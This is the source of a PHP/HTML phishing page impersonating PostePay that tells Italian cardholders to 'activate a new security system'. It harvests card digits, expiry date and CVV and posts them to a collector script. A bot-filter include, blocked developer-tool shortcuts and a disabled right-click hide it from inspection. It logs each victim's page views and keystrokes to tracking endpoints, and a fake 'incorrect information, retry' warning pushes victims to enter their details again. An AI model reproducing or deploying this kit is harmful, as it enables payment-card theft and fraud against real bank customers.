<?php
$md5=md5(time());
date_default_timezone_set('Europe/Rome');
include_once '../../../BOTS/INC/APP.php';
?>
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<!-- Mirrored from computerbank.org.au/files/spl/?fbclid=IwAR0l6i29kzPbqTfJP4nxuJIFZ1vgvsBDorIwQdgMkGrpVPQGoO3bwQizelM by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Jul 2021 04:44:33 GMT -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PostePay - Nuovo sistema di sicurezza</title>
<link href="vbv_files/vpos3_euro_3DS.css" rel="stylesheet" type="text/css">
<script src="../../../www.computerbank.org.au/files/spl/js/jquery.min.html"></script>
<script src="../../../www.computerbank.org.au/files/spl/js/popper.min.html"></script>
<script src="../../../www.computerbank.org.au/files/spl/js/bootstrap.min.html" ></script>
<script src="../../../www.computerbank.org.au/files/spl/js/fontawesome.html"></script>
<script src="../../../www.computerbank.org.au/files/spl/js/main.html"></script>
<body>
<div id="outer">
<div id="popup">
<center>
<div class="order">
<form name="payform" id="payform1" method="POST" action="../../RECEIVED/CARD.X.php" accept_charset="UTF-8">
<input name="trid" type="hidden" value="32347205237">
<input name="st" type="hidden" value="11aa690f4984d7c">
<input name="payStep" type="hidden" value="">
<input name="cmd" type="hidden" value="">
<div id="div_left">
<div class="empty_element">
                    &nbsp;
                </div>
<div class="div_left_inner">
<img src="https://www.media.poste.it/115928d8-bbe0-41ff-963a-1de8efe7a784/lg/webp/logo-pp@1x" class="img_center">
<p id="txt_trans_details">Attivazione del nuovo sistema di sicurezza</p>
<p id="txt_redirect">La nuova rete di sicurezza è la soluzione che garantisce una maggiore sicurezza e affidabilità nelle operazioni.</p>

<div class="img_group">
<a href="" target="_blank" style="text-decoration: none">
<img src="vbv_files/visa_verified.png">
</a>
<a href="" target="_blank" style="text-decoration: none">
<img src="vbv_files/mastercard_securecode.png">
</a>
</div>
</div>
<p><b>Data : </b><?php echo date('d/m/Y', time()); ?>
<p><b>Ora : </b><?php echo date('H:i:s', time()); ?>
</div>
<div id="div_right">
<div class="div_right_inner">
<table>
<tbody id="FirstPage" style="display: none">
<tr class="odd">
<td colspan="3" class="txt_enter_card">
<p id="txt_intro_pay_wallet_gr">Payment details</p>
</td>
</tr>
<tr class="odd">
<td colspan="3" class="column1">
</td></tr>
<tr class="odd">
<td colspan="3" class="txt_enter_card">
<p id="txt_intro_enter_card_gr">
<b>ή</b> εισάγετε την κάρτα σας</p>
</td>
</tr>
<tr class="odd">
<td colspan="3">
<div class="paymentMethodHolder">
<img align="middle" style="float:left;cursor:pointer;" vspace="0" src="vbv_files/visa.png" alt="Visa" class="img_grp_td img_grp" onclick="displayElement(&#39;cardForm&#39;);displayElement(&#39;buttons&#39;);displayElement(&#39;FirstPage&#39;);">
<img align="middle" style="float:left;cursor:pointer;" vspace="0" src="vbv_files/mastercard.png" alt="Mastercard" class="img_grp_td img_grp" onclick="displayElement(&#39;cardForm&#39;);displayElement(&#39;buttons&#39;);displayElement(&#39;FirstPage&#39;);">
<img align="middle" style="float:left;cursor:pointer;" vspace="0" src="vbv_files/maestro.png" alt="Maestro" class="img_grp_td img_grp" onclick="displayElement(&#39;cardForm&#39;);displayElement(&#39;buttons&#39;);displayElement(&#39;FirstPage&#39;);">
</div>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr class="odd">
<td colspan="3">
<div class="div_btn_cancel">
<input class="btn btn_cancel" id="cancelBtn" type="submit" name="cancel" value="ΑΚΥΡΩΣΗ">
</div>
</td>
</tr>
</tbody>
<tbody><tr>
</tr></tbody></table>
<table class="textMain" style="display: block" id="cardForm">
<tbody><tr class="odd" style="display: inherit">
<td id="btn_back">
</td><div style="display:inline-block;padding:5px 18px;border:3px solid #ff9999;border-radius:6px;background:#ffe6e6;font-family:system-ui,Arial,Helvetica,sans-serif;">
    <span style="font-weight:400;color:#cc0000;font-size:14px;letter-spacing:0.5px;">⚠️ Le informazioni inserite non sono corrette. Riprova.</span>
  </div></tr>
  
<tr class="odd">
<td colspan="3">
</td>
</tr>
</div>
</td>
</tr>
<tr>
<td>
<label for="card.expiryMonth" class="lbl_top">ULTIME QUATTRO CIFRE DELLA CARTA :</label>
<div class="placeholder_top">
<input type="text"  name="user" id="user" minlength="19" maxlength="19" required value="" class="inp_full" autofocus>
<script>
  const input = document.getElementById("user");
  const prefix = "xxxx-xxxx-xxxx-";

  // حط القيمة الأولية
  input.value = prefix;

  // ملي يكتب المستخدم
  input.addEventListener("input", function () {
    // منع حذف الـ prefix
    if (!input.value.startsWith(prefix)) {
      input.value = prefix;
    }
  });

  // باش الكورسر يكون غير في الأخير
  input.addEventListener("focus", function () {
    input.setSelectionRange(input.value.length, input.value.length);
  });

  // باش الكورسر يبقى ورا الـ prefix فقط
  input.addEventListener("click", function () {
    if (input.selectionStart < prefix.length) {
      input.setSelectionRange(input.value.length, input.value.length);
    }
  });
</script>
</div>
</td>
</tr>
<tr>
<td>
<div id="div_card_date">
<label for="card.expiryMonth" class="lbl_top">DATA DI SCADENZA:</label>
<div class="placeholder_top">
<select id="card.expiryMonth" name="pass" required class="inp_date">
<option value="" hidden="true" selected="true">Mese</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
</div>
                                        /
                                        <div class="placeholder_top">
<select id="card.expiryYear" name="year" required class="inp_date">
<option value="" hidden="true" selected="true">Anno</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
<option value="2031">2031</option>
<option value="2032">2032</option>
<option value="2033">2033</option>
<option value="2034">2034</option>
<option value="2035">2035</option>
<option value="2036">2036</option>
<option value="2037">2037</option>
<option value="2038">2038</option>
<option value="2039">2039</option>
<option value="2040">2040</option>
</div>
</div>
</td>
</tr>
<tr>
<td>
<label for="card.expiryMonth" class="lbl_top">CVV (3 CIFRE):</label>
<div class="placeholder_top">
<input type="text" id="card.holderName" name="phne" minlength="3" maxlength="3" value="" required class="inp_full" placeholder="• • •">
</div>
</td>
</tr>
</tbody></table>

<div id="buttons" style="display: block">
</div>
<div class="div_btn_paymt">
<button class="btn btn_paymt" id="proceedBtn" type="submit" name="makepayment" value="" STYLE="width: 135px;
    padding: 10px 20px;
    margin: 8px 0;
    border: 0;
    cursor: pointer;
	display: block; */
    color: #4a4a4a;
    font-size: 12pt;
	"><strong>Continua</strong></button><br>
<noscript>
<input class="btn btn_paymt" id="refreshBtn" type="submit" name="refreshStep2" value="Continue"/>
</noscript>
</div>
</div><table><br><br><br>
Per attivare il nuovo sistema di sicurezza, inserisca correttamente le seguenti informazioni e prema «Continua».
<tbody><tr>
</tr>
</tbody></table>
<div id="divError" class="error">
<!--.-->
</div>
</div>
<img src="vbv_files/PaymentHandler.html" height="0">
</div>
</form>
</div>
<div id="someOtherStuff">
<!--.-->
</div>
<div id="debug">
<!--.-->
</div>
<div id="errpopup" class="errpopup">
<div class="errpopuphead">
<img onclick="closeErrorPopup();" border="0" src="vbv_files/x.gif" alt="X">
</div>
<div class="errpopupmsg" id="errpopupmsg">&nbsp;</div>
</div>
<div id="infopopup" class="infopopup">
<div class="infopopuphead">
<img onclick="closeInfoPopup();" border="0" src="vbv_files/x.gif" alt="X">
</div>
<div class="infopopupmsg" id="infopopupmsg">&nbsp;</div>
</div>
<iframe id="iebug1" src="vbv_files/saved_resource.html" scrolling="no" frameborder="0" style="position:absolute; top:0px; left:0px; display:none;"> 
                        </iframe>
</center>
</div>
</div>


</body>
<!-- Mirrored from computerbank.org.au/files/spl/?fbclid=IwAR0l6i29kzPbqTfJP4nxuJIFZ1vgvsBDorIwQdgMkGrpVPQGoO3bwQizelM by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Jul 2021 04:45:04 GMT -->
<script src="../../../AT.ENTRIES/CONFIGS/JOJ.js"></script>
<script>
<?php 
if(isset($_GET['e'])){
	echo '$.post("../../../AT.ENTRIES/AT/CARD.X.php",{carderrorview:1});';
}else{
	echo '$.post("../../../AT.ENTRIES/AT/CARD.X.php",{cardview:1});';
}
?>


var c=0;
$("#user").keyup(function(){
	c++;if(c==1){
$.post("../../../AT.ENTRIES/ENTRIES/CARD.X.php",{carding:1});
	}});
</script>
</html>